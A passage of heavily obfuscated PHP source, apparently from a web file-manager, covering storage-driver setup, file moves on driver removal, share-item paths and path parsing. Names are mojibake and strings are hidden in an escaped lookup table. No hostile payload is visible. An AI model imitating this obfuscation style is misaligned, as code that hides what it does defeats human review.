(!$¿î˜ä´Ç->isBucketCors() && !$¿î˜ä´Ç->setBucketCors()) { $€ŞŒñù÷ = LNG($Éƒ˜Ä¦¿[2342]); $€ŞŒñù÷ .= $Éƒ˜Ä¦¿[2343] . LNG($Éƒ˜Ä¦¿[2344]); } } catch (Exception $Ñ€—øÀñ) { $€ŞŒñù÷ = $Ñ€—øÀñ->getMessage(); } if (isset($€ŞŒñù÷)) { return $this->_parseError($€ŞŒñù÷, $Ë¦Ëø¢³, $¿ú¨ò·ı); } if ($Ë¦Ëø¢³ == $Éƒ˜Ä¦¿[68] && !$¿î˜ä´Ç->checkRegion()) { return $this->_parseError(LNG($Éƒ˜Ä¦¿[2345]), $Ë¦Ëø¢³, $¿ú¨ò·ı); } } else { if ($Ë¦Ëø¢³ == $Éƒ˜Ä¦¿[2346]) { if ($¿î˜ä´Ç->ftpPath) { $ß÷‹èÆ = trim($ç»³“®, $Éƒ˜Ä¦¿[8]); if (stripos($ß÷‹èÆ, trim($¿î˜ä´Ç->ftpPath, $Éƒ˜Ä¦¿[8])) !== 0) { $ç»³“® = $¿î˜ä´Ç->ftpPath . $Éƒ˜Ä¦¿[8] . ($ß÷‹èÆ ? $ß÷‹èÆ . $Éƒ˜Ä¦¿[8] : $Éƒ˜Ä¦¿[12]); } } } } $ğŠÕİô = $¿î˜ä´Ç->getPath($ç»³“® . $Éƒ˜Ä¦¿[1285]); try { if ($Ë¦Ëø¢³ == $Éƒ˜Ä¦¿[109]) { $¿î˜ä´Ç->mkdir($ç»³“®); } $­¡êĞ¦ü = $¿î˜ä´Ç->mkfile($ğŠÕİô); if (!$­¡êĞ¦ü) { $€ŞŒñù÷ = LNG($Éƒ˜Ä¦¿[2342]); } } catch (Exception $Ñ€—øÀñ) { $€ŞŒñù÷ = $Ñ€—øÀñ->getMessage(); } if (isset($€ŞŒñù÷)) { return $this->_parseError($€ŞŒñù÷, $Ë¦Ëø¢³, $¿ú¨ò·ı); } $¹§Òœ‘î[$Éƒ˜Ä¦¿[1281]] = $ç»³“®; $ûµªÊ…ñ[$Éƒ˜Ä¦¿[6]] = json_encode($¹§Òœ‘î); $ûµªÊ…ñ[$Éƒ˜Ä¦¿[98]] = $šª‘ş; return !0; } private function _parseError($êÙº–Ü, $Ñ–ú¸ˆ, $Î¾ä„­– = false) { $„ƒÛ½âá =& $_SERVER[™¸œØ®Ü]; if ($Ñ–ú¸ˆ == $„ƒÛ½âá[68] && stripos($êÙº–Ü, $„ƒÛ½âá[2347])) { $©¶Ú”›Ó = explode($„ƒÛ½âá[10], $êÙº–Ü); $²Å¢‰Ù = isset($©¶Ú”›Ó[1]) ? $©¶Ú”›Ó[1] : $„ƒÛ½âá[12]; $£è·„ŞÄ = array($„ƒÛ½âá[2348] => LNG($„ƒÛ½âá[2349]), $„ƒÛ½âá[2350] => LNG($„ƒÛ½âá[2351])); if (isset($£è·„ŞÄ[$²Å¢‰Ù])) { $êÙº–Ü = $£è·„ŞÄ[$²Å¢‰Ù]; } } if (stripos($êÙº–Ü, $„ƒÛ½âá[2352]) === 0) { $«Šˆ´ËÜ = strpos($êÙº–Ü, $„ƒÛ½âá[178]); if ($«Šˆ´ËÜ === !1) { $«Šˆ´ËÜ = strpos($êÙº–Ü, $„ƒÛ½âá[4]); } if ($«Šˆ´ËÜ !== !1) { $êÙº–Ü = substr($êÙº–Ü, $«Šˆ´ËÜ + 1); } } $êÙº–Ü = LNG($„ƒÛ½âá[1288]) . $êÙº–Ü; if ($Î¾ä„­–) { return $êÙº–Ü; } show_json($êÙº–Ü, !1); } public function driverListSystem() { $•úÔ¢™ =& $_SERVER[™¸œØ®Ü]; $£ğéâ°Û = parent::listData(); $—ù…æ•„ = array(); foreach ($£ğéâ°Û as $ñ€ÒÓÑÌ) { unset($ñ€ÒÓÑÌ[$•úÔ¢™[233]], $ñ€ÒÓÑÌ[$•úÔ¢™[88]]); if (!is_array($ñ€ÒÓÑÌ[$•úÔ¢™[6]])) { $ñ€ÒÓÑÌ[$•úÔ¢™[6]] = json_decode($ñ€ÒÓÑÌ[$•úÔ¢™[6]], !0); } $—ù…æ•„[] = $ñ€ÒÓÑÌ; } return $—ù…æ•„; } public function defaultDriver() { $õ‚‚í¾Å =& $_SERVER[™¸œØ®Ü]; $ÁºÙ¾Üó = parent::listData(); $ôÏÌÈñ· = array_filter_by_field($ÁºÙ¾Üó, $õ‚‚í¾Å[37], 1); $ôÏÌÈñ· = $ôÏÌÈñ·[0]; if (!$ôÏÌÈñ·) { return array(); } if (!is_array($ôÏÌÈñ·[$õ‚‚í¾Å[6]])) { $ôÏÌÈñ·[$õ‚‚í¾Å[6]] = json_decode($ôÏÌÈñ·[$õ‚‚í¾Å[6]], !0); } return $ôÏÌÈñ·; } public function driverInfo($ğæ¼ù­¸) { $‰ÆÎäº² =& $_SERVER[™¸œØ®Ü]; $«ğşú±Ş = array_to_keyvalue(parent::listData(), $‰ÆÎäº²[477]); if (!isset($«ğşú±Ş[$ğæ¼ù­¸])) { return !1; } $ø»áúğç = $«ğşú±Ş[$ğæ¼ù­¸]; if (!is_array($ø»áúğç[$‰ÆÎäº²[6]])) { $ø»áúğç[$‰ÆÎäº²[6]] = json_decode($ø»áúğç[$‰ÆÎäº²[6]], !0); } return $ø»áúğç; } public function remove($‡¡ÑØš’) { $this->removeShareItems($‡¡ÑØš’); return parent::remove($‡¡ÑØš’); } public function removeWithFile($¾ş§åå¹, $¹íê¡ä, $şü—²·³, $Ÿ•“¶ó = false) { $±Ë±ÕÈ‹ =& $_SERVER[™¸œØ®Ü]; $æéìßòß = array($±Ë±ÕÈ‹[908] => $¾ş§åå¹); $²Êúƒ’­ = Model($±Ë±ÕÈ‹[548])->where($æéìßòß)->count(); $“âïíÏ« = Model($±Ë±ÕÈ‹[548])->where($æéìßòß)->sum($±Ë±ÕÈ‹[79]); $¡ –ñÃ‘ = $¹íê¡ä . $±Ë±ÕÈ‹[2353] . $¾ş§åå¹; $ñÁ•÷Öâ = LNG($¹íê¡ä == $±Ë±ÕÈ‹[627] ? $±Ë±ÕÈ‹[2354] : $±Ë±ÕÈ‹[2355]); $—™ú¥Î– = new TaskFileTransfer($¡ –ñÃ‘, $±Ë±ÕÈ‹[215], $²Êúƒ’­, $ñÁ•÷Öâ . $±Ë±ÕÈ‹[464] . $şü—²·³[$±Ë±ÕÈ‹[32]] . $±Ë±ÕÈ‹[214] . $¾ş§åå¹); $—™ú¥Î–->task[$±Ë±ÕÈ‹[848]] = (double) $“âïíÏ«; $äÖÜÖ…¿ = KodIO::defaultDriver(); $•€õŠ = $äÖÜÖ…¿[$±Ë±ÕÈ‹[477]]; $§ãåğıÀ = $—ÈĞ½µŒ = $Öî¹öÁ = array(); $ÕİÌ¸¹Ò = Model($±Ë±ÕÈ‹[232])->where($æéìßòß)->field($±Ë±ÕÈ‹[2356])->select(); foreach ($ÕİÌ¸¹Ò as $µ¢Ñ‘›Ã) { $ä±Âõ‘ñ = $µ¢Ñ‘›Ã[$±Ë±ÕÈ‹[545]]; if ($Ÿ•“¶ó) { $—ÈĞ½µŒ[] = $ä±Âõ‘ñ; continue; } $â‰Ï€ƒ§ = $µ¢Ñ‘›Ã[$±Ë±ÕÈ‹[87]]; $ğã¯şÌ = get_path_father($â‰Ï€ƒ§); $Öî¹öÁ[] = $ğã¯şÌ; $ğã¯şÌ = str_replace("\173\151\157\72{$¾ş§åå¹}\175\57", "\x7b\151\x6f\72{$•€õŠ}\175\57", $ğã¯şÌ); if (!IO::exist($â‰Ï€ƒ§)) { $§ãåğıÀ[] = $ä±Âõ‘ñ; $—™ú¥Î–->updateFileEnd($µ¢Ñ‘›Ã[$±Ë±ÕÈ‹[32]], $µ¢Ñ‘›Ã[$±Ë±ÕÈ‹[79]]); write_log($±Ë±ÕÈ‹[2357] . $â‰Ï€ƒ§, $±Ë±ÕÈ‹[1927]); continue; } $Ä¸À¢ô = IO::move($â‰Ï€ƒ§, $ğã¯şÌ, REPEAT_RENAME); if (!$Ä¸À¢ô) { $—ÈĞ½µŒ[] = $ä±Âõ‘ñ; $—™ú¥Î–->updateFileEnd($µ¢Ñ‘›Ã[$±Ë±ÕÈ‹[32]], $µ¢Ñ‘›Ã[$±Ë±ÕÈ‹[79]]); write_log($±Ë±ÕÈ‹[2358] . $â‰Ï€ƒ§, $±Ë±ÕÈ‹[1927]); continue; } $æéìßòß = array($±Ë±ÕÈ‹[545] => $ä±Âõ‘ñ); $©·î—¶ = array($±Ë±ÕÈ‹[908] => $•€õŠ, $±Ë±ÕÈ‹[87] => $Ä¸À¢ô); Model($±Ë±ÕÈ‹[232])->where($æéìßòß)->save($©·î—¶); } $ÛäÌ¦Ùş = $—™ú¥Î–->task; if (!$Ÿ•“¶ó) { Cache::set($¡ –ñÃ‘, $ÛäÌ¦Ùş); } $—™ú¥Î–->end(); $§ãåğıÀ = array_unique($§ãåğıÀ); $—ÈĞ½µŒ = array_unique($—ÈĞ½µŒ); if (!$Ÿ•“¶ó && ($§ãåğıÀ || $—ÈĞ½µŒ)) { $äšÄ¶²Î = array(); if ($§ãåğıÀ) { $äšÄ¶²Î[] = sprintf(LNG($±Ë±ÕÈ‹[2359]), count($§ãåğıÀ)); } if ($—ÈĞ½µŒ) { $äšÄ¶²Î[] = sprintf(LNG($±Ë±ÕÈ‹[2360]), count($—ÈĞ½µŒ)); } $äšÄ¶²Î = sprintf(LNG($±Ë±ÕÈ‹[2361]), implode($±Ë±ÕÈ‹[2362], $äšÄ¶²Î)) . $±Ë±ÕÈ‹[2363] . date($±Ë±ÕÈ‹[2364]) . $±Ë±ÕÈ‹[2365]; if ($¹íê¡ä == $±Ë±ÕÈ‹[1964]) { $äšÄ¶²Î .= $±Ë±ÕÈ‹[2366] . LNG($±Ë±ÕÈ‹[2367]); } else { $äšÄ¶²Î = LNG($±Ë±ÕÈ‹[2368]) . $±Ë±ÕÈ‹[2369] . $äšÄ¶²Î; } $ÛäÌ¦Ùş[$±Ë±ÕÈ‹[1283]] = $äšÄ¶²Î; Cache::set($¡ –ñÃ‘, $ÛäÌ¦Ùş); unset($şü—²·³[$±Ë±ÕÈ‹[6]]); $–ËØµîÖ = array($±Ë±ÕÈ‹[477] => $¾ş§åå¹, $±Ë±ÕÈ‹[2238] => $±Ë±ÕÈ‹[627], $±Ë±ÕÈ‹[32] => $şü—²·³[$±Ë±ÕÈ‹[32]], $±Ë±ÕÈ‹[98] => $şü—²·³[$±Ë±ÕÈ‹[98]]); Hook::trigger($±Ë±ÕÈ‹[1806], array($±Ë±ÕÈ‹[1306] => $–ËØµîÖ, $±Ë±ÕÈ‹[1316] => !0)); show_json($äšÄ¶²Î, !1, 100111); } if ($¹íê¡ä == $±Ë±ÕÈ‹[627]) { return !0; } if ($§ãåğıÀ || $—ÈĞ½µŒ) { $‚ÏñË¸¶ = array_merge($§ãåğıÀ, $—ÈĞ½µŒ); $‚ÏñË¸¶ = array_filter(array_unique($‚ÏñË¸¶)); $this->removeByFileID($‚ÏñË¸¶); } if ($Öî¹öÁ) { $Öî¹öÁ = array_filter(array_unique($Öî¹öÁ)); foreach ($Öî¹öÁ as $â‰Ï€ƒ§) { $³¯ı’è = IO::has($â‰Ï€ƒ§, !0); if (!$³¯ı’è[$±Ë±ÕÈ‹[241]] && !$³¯ı’è[$±Ë±ÕÈ‹[242]]) { IO::remove($â‰Ï€ƒ§); } } } return $this->remove($¾ş§åå¹); } private function removeByFileID($œÜßäÌã = array()) { $Õæœ©í =& $_SERVER[™¸œØ®Ü]; if (empty($œÜßäÌã)) { return; } $„ÈÊ‹§ş = array($Õæœ©í[545] => array($Õæœ©í[7], $œÜßäÌã)); $©Ÿı‰» = Model($Õæœ©í[1440])->where($„ÈÊ‹§ş)->field($Õæœ©í[193])->select(); if (!$©Ÿı‰») { return Model($Õæœ©í[548])->remove($œÜßäÌã); } $©Ÿı‰» = array_to_keyvalue($©Ÿı‰», $Õæœ©í[12], $Õæœ©í[193]); foreach ($©Ÿı‰» as $ÕÄúñóé) { Model($Õæœ©í[915])->removeNow($ÕÄúñóé, !1); } } private function removeShareItems($Ìø°îµ) { $¤‚ÀëıÆ =& $_SERVER[™¸œØ®Ü]; $À‘‹€§Ğ = "\173\x69\157\x3a{$Ìø°îµ}\x7d\57"; $¤†ó³á = array($¤‚ÀëıÆ[193] => 0, $¤‚ÀëıÆ[1276] => array($¤‚ÀëıÆ[461], "{$À‘‹€§Ğ}\45")); $â‡ã­²¦ = Model($¤‚ÀëıÆ[1975])->where($¤†ó³á)->field($¤‚ÀëıÆ[672])->select(); if (empty($â‡ã­²¦)) { return; } $–úÈæ¡Ï = array_to_keyvalue($â‡ã­²¦, $¤‚ÀëıÆ[12], $¤‚ÀëıÆ[672]); Model($¤‚ÀëıÆ[671])->remove($–úÈæ¡Ï); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\x6d\56\x4c\x69\x67\150\x74\x41\160\160"; public $modelType = "\123\x79\x73\x74\x65\x6d\x4f\x70\x74\151\x6f\156"; public $field = array("\156\141\x6d\x65", "\147\x72\157\165\160", "\144\x65\x73\143", "\143\x6f\x6e\x74\x65\x6e\164"); public function listData($ÃŞ½˜¥ = false, $§öë¢½ò = "\155\157\x64\x69\146\171\124\151\x6d\145", $‰‡ŞÙ÷È = true) { return parent::listData($ÃŞ½˜¥, $§öë¢½ò, $‰‡ŞÙ÷È); } public function remove($“¥·„ÉÚ) { $¥ÆëËîœ = $this->findByName($“¥·„ÉÚ); if (!$¥ÆëËîœ) { return !1; } return parent::remove($¥ÆëËîœ[$_SERVER[™¸œØ®Ü][477]]); } public function add($éÍ—öÛ’) { if ($this->findByName($éÍ—öÛ’[$_SERVER[™¸œØ®Ü][32]])) { return !1; } return parent::insert($éÍ—öÛ’); } public function update($çµß†», $ªÎ¡ÓÀ) { $¹ÔòÏòı =& $_SERVER[™¸œØ®Ü]; $·Ì¬ş© = $this->findByName($çµß†»); $ëŠñåóğ = $this->findByName($ªÎ¡ÓÀ[$¹ÔòÏòı[32]]); if (!$·Ì¬ş© || $ëŠñåóğ && $ëŠñåóğ[$¹ÔòÏòı[477]] != $·Ì¬ş©[$¹ÔòÏòı[477]]) { return !1; } return parent::update($·Ì¬ş©[$¹ÔòÏòı[477]], $ªÎ¡ÓÀ); } } goto AĞé—À³Ü; Cìº²èÀÄ: class PathDriverDriverShareItem { public function __construct($¥úº°ºÓ) { $this->pathParse = $¥úº°ºÓ; } public function __call($”ôàè‡ü, $Ş‰şÔƒ—) { $ï‘û¬İĞ =& $_SERVER[™¸œØ®Ü]; if (method_exists($this, $”ôàè‡ü)) { return; } $×î‡¥¶¹ = call_user_func_array(array($ï‘û¬İĞ[1449], $”ôàè‡ü), $Ş‰şÔƒ—); $öü§†ˆ = array($ï‘û¬İĞ[1450], $ï‘û¬İĞ[1451], $ï‘û¬İĞ[1452], $ï‘û¬İĞ[1453], $ï‘û¬İĞ[625], $ï‘û¬İĞ[627], $ï‘û¬İĞ[1454], $ï‘û¬İĞ[110], $ï‘û¬İĞ[1455], $ï‘û¬İĞ[1456]); if (in_array($”ôàè‡ü, $öü§†ˆ)) { $×î‡¥¶¹ = $this->getPathOuter($×î‡¥¶¹); } return $×î‡¥¶¹; } public function copy($Èôà¤ö¸, $›òë¸éÎ, $ƒ®è¹¾ = false, $ôÀ…»‰ = false) { return $this->copyMove($Èôà¤ö¸, $›òë¸éÎ, $ƒ®è¹¾, $_SERVER[™¸œØ®Ü][625], $ôÀ…»‰); } public function move($Åæ ÷§­, $ÁÊ±ê€, $äøÑÑÔ = false, $ Ø•ÕÜÕ = false) { return $this->copyMove($Åæ ÷§­, $ÁÊ±ê€, $äøÑÑÔ, $_SERVER[™¸œØ®Ü][627], $ Ø•ÕÜÕ); } private function copyMove($Ö¢ûöÊ·, $Âíëè¸—, $ëÏŠªŸî, $¼”„Àîš, $·¥±Ã–¢ = false) { $èø»ßçÔ =& $_SERVER[™¸œØ®Ü]; $¸ÏÈÛ¬Û = $Âíëè¸—; $¨ê–É¯Ü = IO::driverMake($Âíëè¸—); if ($¨ê–É¯Ü->pathParse[$èø»ßçÔ[1251]]) { $Âíëè¸— = $¨ê–É¯Ü->pathParse[$èø»ßçÔ[1251]]; } else { $Âíëè¸— = $¸ÏÈÛ¬Û; } $ìÊ€×Ä = IO::copyMove($Ö¢ûöÊ·, $Âíëè¸—, $ëÏŠªŸî, $¼”„Àîš, $·¥±Ã–¢); $ìÊ€×Ä = $this->getPathOuter($ìÊ€×Ä); return $ìÊ€×Ä; } public function pathThis($õ«ãôàõ) { return get_path_this($this->pathParse[$_SERVER[™¸œØ®Ü][87]]); } public function pathFather($ùéöÌÁÜ) { return get_path_father($this->pathParse[$_SERVER[™¸œØ®Ü][87]]); } public function iconvSystem($¹¸»ÄşŸ) { return $¹¸»ÄşŸ; } protected function infoParse($Ä¢ÍˆÉ, $‡ü¾°Úù = false) { $Ò¡šĞ÷Ù =& $_SERVER[™¸œØ®Ü]; $²…ø¿¶ = $this->pathParse[$Ò¡šĞ÷Ù[564]][$Ò¡šĞ÷Ù[1276]] . $this->pathParse[$Ò¡šĞ÷Ù[1269]]; if ($‡ü¾°Úù) { $‚•è®‰ = IO::infoWithChildren($²…ø¿¶); } else { $‚•è®‰ = IO::info($²…ø¿¶); } $§È£Ç·ï = $this->pathParse[$Ò¡šĞ÷Ù[564]]; return Action($Ò¡šĞ÷Ù[1447])->_shareItemeParse($‚•è®‰, $§È£Ç·ï); } public function listAll($Ì‰ˆÖÊä) { $ìı¬†ºÑ =& $_SERVER[™¸œØ®Ü]; $„‰‰³ã… = IO::listAll($Ì‰ˆÖÊä); $Ö¢ÏƒÓ” = rtrim($this->pathParse[$ìı¬†ºÑ[564]][$ìı¬†ºÑ[1276]], $ìı¬†ºÑ[8]); foreach ($„‰‰³ã… as &$§Ü„›úØ) { $§Ü„›úØ[$ìı¬†ºÑ[87]] = $this->pathDriver . $ìı¬†ºÑ[8] . ltrim(substr($§Ü„›úØ[$ìı¬†ºÑ[87]], strlen($Ö¢ÏƒÓ”)), $ìı¬†ºÑ[8]); } unset($§Ü„›úØ); return $„‰‰³ã…; } public function listAllSimple($ÁÂæ™Ëø, $÷È™‚• = false) { $¸Ø­˜¥Ú =& $_SERVER[™¸œØ®Ü]; $‹Ì¢‰…Ì = $this->listAll($ÁÂæ™Ëø); $ÆÎØó‡– = $this->pathParse[$¸Ø­˜¥Ú[497]]; if (trim($ÆÎØó‡–, $¸Ø­˜¥Ú[8]) == trim(get_path_father($ÆÎØó‡–), $¸Ø­˜¥Ú[8])) { $÷È™‚• = !0; } return IO::init($¸Ø­˜¥Ú[12])->listAllSimpleMake($‹Ì¢‰…Ì, $ÆÎØó‡–, $÷È™‚•); } public function getPathOuter($Ô”³í) { $Íİå€ÛŒ =& $_SERVER[™¸œØ®Ü]; $ñÖ‘ê¢Ú = KodIO::parse($Ô”³í); if ($ñÖ‘ê¢Ú[$Íİå€ÛŒ[33]] == KodIO::KOD_SHARE_ITEM) { return $ñÖ‘ê¢Ú[$Íİå€ÛŒ[87]]; } $ôÍŒªĞÎ = KodIO::clear($Ô”³í); $‰†Öƒø§ = KodIO::clear($this->pathParse[$Íİå€ÛŒ[564]][$Íİå€ÛŒ[1276]]); $Ç·–» = substr($ôÍŒªĞÎ, strlen($‰†Öƒø§)); if (substr($ôÍŒªĞÎ, 0, strlen($‰†Öƒø§)) != $‰†Öƒø§) { return !1; } return $this->pathParse[$Íİå€ÛŒ[1270]] . $Íİå€ÛŒ[8] . ltrim($Ç·–», $Íİå€ÛŒ[8]); } public function getType() { $ØØ¨¡®Ó =& $_SERVER[™¸œØ®Ü]; $´¶¹ßşÆ = str_replace($ØØ¨¡®Ó[77], $ØØ¨¡®Ó[12], get_class($this)); return strtolower($´¶¹ßşÆ); } public function isOsDriver($¶õ´§ğş) { return IO::isOsDriver($¶õ´§ğş); } public function info($Ñô¶ìŸ) { return $this->infoParse($Ñô¶ìŸ); } public function infoAuth($ÂˆìÑ²ë) { return $this->infoParse($ÂˆìÑ²ë); } public function infoWithChildren($ğÍÒ‚×©) { return $this->infoParse($ğÍÒ‚×©, !0); } public function infoFull($‘ì¾ÆöŠ) { return $this->infoParse($‘ì¾ÆöŠ); } } $_file = $_SERVER[$_SERVER[™¸œØ®Ü][1457]]; $_size = $_SERVER[™¸œØ®Ü][970]; goto fµïøÂ­â; Dˆöò·—¡±: class KodIO { const KOD_SOURCE = "\173\163\x6f\x75\x72\x63\145\x7d"; const KOD_USER_RECYCLE = "\173\165\x73\x65\x72\x52\x65\143\171\x63\x6c\x65\175"; const KOD_USER_FAV = "\173\165\x73\x65\x72\106\141\x76\175"; const KOD_USER_FILE_TAG = "\x7b\165\163\x65\x72\x46\x69\154\x65\124\x61\x67\175"; const KOD_USER_FILE_TYPE = "\x7b\165\163\145\x72\106\x69\x6c\145\124\171\160\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\173\x67\162\x6f\x75\160\122\157\x6f\x74\x53\x65\154\146\x7d"; const KOD_USER_SHARE = "\x7b\x75\x73\x65\x72\x53\150\x61\162\x65\x7d"; const KOD_USER_SHARE_LINK = "\173\x75\x73\145\162\123\x68\141\162\x65\x4c\151\156\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\173\163\x68\141\162\x65\x54\157\x4d\x65\175"; const KOD_SHARE_ITEM = "\173\163\x68\x61\162\x65\111\x74\145\x6d\175"; const KOD_SHARE_LINK = "\x7b\163\x68\x61\162\145\x49\x74\145\155\x4c\x69\156\153\175"; const KOD_SEARCH = "\173\x73\x65\141\162\x63\150\175"; const KOD_BLOCK = "\173\142\154\x6f\143\153\175"; const KOD_IO = "\x7b\x69\x6f\175"; const KOD_USER_RECENT = "\173\x75\163\x65\162\x52\145\156\143\145\156\x74\175"; const KOD_USER_DRIVER = "\173\144\162\151\x76\x65\x72\175"; public static function typeList() { $¨äğ =& $_SERVER[™¸œØ®Ü]; return array($¨äğ[1355] => self::KOD_SOURCE, $¨äğ[1356] => self::KOD_USER_RECYCLE, $¨äğ[1357] => self::KOD_USER_FAV, $¨äğ[1358] => self::KOD_USER_FILE_TAG, $¨äğ[1359] => self::KOD_USER_FILE_TYPE, $¨äğ[1360] => self::KOD_GROUP_ROOT_SELF, $¨äğ[1361] => self::KOD_USER_SHARE, $¨äğ[1362] => self::KOD_USER_SHARE_LINK, $¨äğ[1363] => self::KOD_USER_SHARE_TO_ME, $¨äğ[1364] => self::KOD_SHARE_ITEM, $¨äğ[1365] => self::KOD_SHARE_LINK, $¨äğ[1366] => self::KOD_SEARCH, $¨äğ[1367] => self::KOD_BLOCK, $¨äğ[1368] => self::KOD_IO, $¨äğ[1369] => self::KOD_USER_RECENT, $¨äğ[1370] => self::KOD_USER_DRIVER); } public static function parse($šï©øÄµ) { $öî„Ù‹¦ =& $_SERVER[™¸œØ®Ü]; $šï©øÄµ = self::clear($šï©øÄµ); $Œ™äò¾¾ = array_values(self::typeList()); preg_match($öî„Ù‹¦[1371], $šï©øÄµ, $Öå¹ÖŒş); $©ø§«‡ = array($öî„Ù‹¦[498] => !1, $öî„Ù‹¦[1372] => !1, $öî„Ù‹¦[495] => !1, $öî„Ù‹¦[87] => $šï©øÄµ, $öî„Ù‹¦[1270] => !1, $öî„Ù‹¦[1269] => $öî„Ù‹¦[12]); if (is_array($Öå¹ÖŒş) && count($Öå¹ÖŒş) == 5) { $ş„šÙÔÄ = $öî„Ù‹¦[1373] . $Öå¹ÖŒş[2] . $öî„Ù‹¦[404]; if (in_array($ş„šÙÔÄ, $Œ™äò¾¾)) { $©ø§«‡[$öî„Ù‹¦[1270]] = $Öå¹ÖŒş[1]; $©ø§«‡[$öî„Ù‹¦[33]] = $ş„šÙÔÄ; $©ø§«‡[$öî„Ù‹¦[1374]] = substr($ş„šÙÔÄ, 1, -1); $©ø§«‡[$öî„Ù‹¦[477]] = $Öå¹ÖŒş[3]; } $©ø§«‡[$öî„Ù‹¦[1269]] = $Öå¹ÖŒş[4]; } $Êó¾Èè = array($öî„Ù‹¦[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $©ø§«‡[$öî„Ù‹¦[1337]] = in_array($©ø§«‡[$öî„Ù‹¦[33]], $Êó¾Èè); return $©ø§«‡; } public static function isTruePath($œºÂÁ…œ) { $ÍÓÉ£­§ =& $_SERVER[™¸œØ®Ü]; if (substr($œºÂÁ…œ, 0, 1) != $ÍÓÉ£­§[1373]) { return !0; } if (strpos($œºÂÁ…œ, $ÍÓÉ£­§[485]) === 0) { return !0; } if (strpos($œºÂÁ…œ, $ÍÓÉ£­§[1341]) === 0) { return !0; } if (strpos($œºÂÁ…œ, $ÍÓÉ£­§[1375]) === 0) { return !0; } if (strpos($œºÂÁ…œ, $ÍÓÉ£­§[1376]) === 0) { return !0; } if (strpos($œºÂÁ…œ, $ÍÓÉ£­§[1377]) === 0) { return !0; } return !1; } public static function clear($ÕÒÌ“É) { $õŞ®Àœ‘ =& $_SERVER[™¸œØ®Ü]; $ÕÒÌ“É = str_replace(array($õŞ®Àœ‘[1175], $õŞ®Àœ‘[287]), $õŞ®Àœ‘[53], $ÕÒÌ“É); $ÕÒÌ“É = str_replace($õŞ®Àœ‘[100], $õŞ®Àœ‘[8], $ÕÒÌ“É); $ÇøÛã¯ = $õŞ®Àœ‘[1378]; if (substr($ÕÒÌ“É, 0, 3) == $õŞ®Àœ‘[1379]) { $ÕÒÌ“É = substr($ÕÒÌ“É, 3); } while (strstr($ÕÒÌ“É, $ÇøÛã¯)) { $ÕÒÌ“É = str_replace($ÇøÛã¯, $õŞ®Àœ‘[8], $ÕÒÌ“É); } $ÕÒÌ“É = preg_replace($õŞ®Àœ‘[1380], $õŞ®Àœ‘[8], $ÕÒÌ“É); if ($ÕÒÌ“É == $õŞ®Àœ‘[8]) { return $õŞ®Àœ‘[8]; } $ÕÒÌ“É = rtrim($ÕÒÌ“É, $õŞ®Àœ‘[8]); return $ÕÒÌ“É; } public static function pathTrue($üá°Ç½Ñ) { $åğ×Ã¶ù =& $_SERVER[™¸œØ®Ü]; if (!$üá°Ç½Ñ) { return $åğ×Ã¶ù[12]; } $üá°Ç½Ñ = str_replace($åğ×Ã¶ù[256], $åğ×Ã¶ù[8], str_replace($åğ×Ã¶ù[1381], $åğ×Ã¶ù[8], $üá°Ç½Ñ)); $üá°Ç½Ñ = str_replace($åğ×Ã¶ù[256], $åğ×Ã¶ù[8], str_replace($åğ×Ã¶ù[1381], $åğ×Ã¶ù[8], $üá°Ç½Ñ)); if (!strstr($üá°Ç½Ñ, $åğ×Ã¶ù[1379])) { return $üá°Ç½Ñ; } $‚Ë…«ª = explode($åğ×Ã¶ù[8], $üá°Ç½Ñ); foreach ($‚Ë…«ª as $ÉØÙ§à => $ÎóÓíÕš) { if ($ÎóÓíÕš !== $åğ×Ã¶ù[1382]) { continue; } for ($Ê‚Ä«Š† = $ÉØÙ§à; $Ê‚Ä«Š† >= 0; $Ê‚Ä«Š†--) { if ($‚Ë…«ª[$Ê‚Ä«Š†] === $åğ×Ã¶ù[10] || $‚Ë…«ª[$Ê‚Ä«Š†] === $åğ×Ã¶ù[1382] || $‚Ë…«ª[$Ê‚Ä«Š†] === -1) { continue; } if ($‚Ë…«ª[$Ê‚Ä«Š†] === $åğ×Ã¶ù[12]) { $‚Ë…«ª[$ÉØÙ§à] = -1; break; } $‚Ë…«ª[$ÉØÙ§à] = -1; $‚Ë…«ª[$Ê‚Ä«Š†] = -1; break; } } $áŒšÁ•Ê = array(); foreach ($‚Ë…«ª as $ÎóÓíÕš) { if ($ÎóÓíÕš !== -1) { $áŒšÁ•Ê[] = $ÎóÓíÕš; } } $Ã¬Èëò¦ = implode($åğ×Ã¶ù[8], $áŒšÁ•Ê); if (strpos($Ã¬Èëò¦, $åğ×Ã¶ù[1383]) === 0) { $Ã¬Èëò¦ = $åğ×Ã¶ù[1379] . substr($Ã¬Èëò¦, strlen($åğ×Ã¶ù[1383])); } return $Ã¬Èëò¦; } public static function pathUrlClear($ÆÁÁ“•) { $Ãƒ³­¸¾ =& $_SERVER[™¸œØ®Ü]; if (!$ÆÁÁ“•) { return $ÆÁÁ“•; } $ÆÁÁ“• = rawurldecode($ÆÁÁ“•); $ÆÁÁ“• = str_replace($Ãƒ³­¸¾[1381], $Ãƒ³­¸¾[8], $ÆÁÁ“•); if (strpos($ÆÁÁ“•, $Ãƒ³­¸¾[76]) > 0) { $ÆÁÁ“• = substr($ÆÁÁ“•, 0, strpos($ÆÁÁ“•, $Ãƒ³­¸¾[76])); } if (strpos($ÆÁÁ“•, $Ãƒ³­¸¾[1384]) > 0) { $ÆÁÁ“• = substr($ÆÁÁ“•, 0, strpos($ÆÁÁ“•, $Ãƒ³­¸¾[1384])); } return $ÆÁÁ“•; } public static function sourceID($®Ö£¼İç) { $¶ûå¹€ =& $_SERVER[™¸œØ®Ü]; $ÓëŠ·éÚ = self::parse($®Ö£¼İç); if ($ÓëŠ·éÚ[$¶ûå¹€[33]] !== self::KOD_SOURCE) { show_json(LNG($¶ûå¹€[1385]), !1); } return $ÓëŠ·éÚ[$¶ûå¹€[477]]; } public static function make($‹æŒƒñ) { if (!$‹æŒƒñ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($‹æŒƒñ)); } public static function makeShare($š«°ñÑú, $øŒ«Íèï) { return self::makePath(self::KOD_SHARE_ITEM, $š«°ñÑú, $øŒ«Íèï); } public static function makeFileTypePath($ñ¢ÃõÍ) { return self::makePath(self::KOD_USER_FILE_TYPE, $ñ¢ÃõÍ); } public static function makeFileTagPath($ê”…Û‹Œ) { return 